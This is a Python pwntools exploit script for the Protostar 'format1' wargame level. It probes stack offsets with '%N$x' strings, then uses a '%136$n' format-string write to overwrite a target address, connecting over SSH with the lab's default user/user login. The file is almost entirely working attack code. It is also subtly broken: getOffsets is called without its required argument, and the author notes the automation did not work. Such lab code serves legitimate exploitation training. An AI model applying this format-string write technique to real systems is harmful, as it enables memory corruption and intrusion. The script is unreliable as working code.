#!/usr/bin/env python
from pwn import *
import sys

targetAddr = 0x08049638 # objdump -t format1 | grep target
e = ELF('./format1')

def getOffsets(ipAddr):

    for i in range(212):
        payload = "AAAA"
        payload += ":%%%d$x" % i
        r = process([e.path, payload])
        response = r.recv()
        print(str(i) +  " => " + response)
        r.close()
def testLocal():
    i = 211
    payload = p32(targetAddr) + "B"
    payload += "%%%d$n" % i
    r = process([e.path, payload])
    print(r.recvuntil("target"))
    r.close()


def exploit(ipAddr):
    # I did not get it to automate exploit, but offset was 136 at protostar.
    i = 136     # different than 211 in remote computer
    s = ssh("user", ipAddr, 22, password="user")
    payload = "AAA" + p32(targetAddr) + "C"
    payload += "%136$n"
    r = s.run('/opt/protostar/bin/format1 {}'.format(payload))
    print(r.recv())
    r.close()

if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
elif sys.argv[1] == "offset":
    getOffsets()
elif sys.argv[1] == "local":
    testLocal()
else:
    exploit(sys.argv[1])


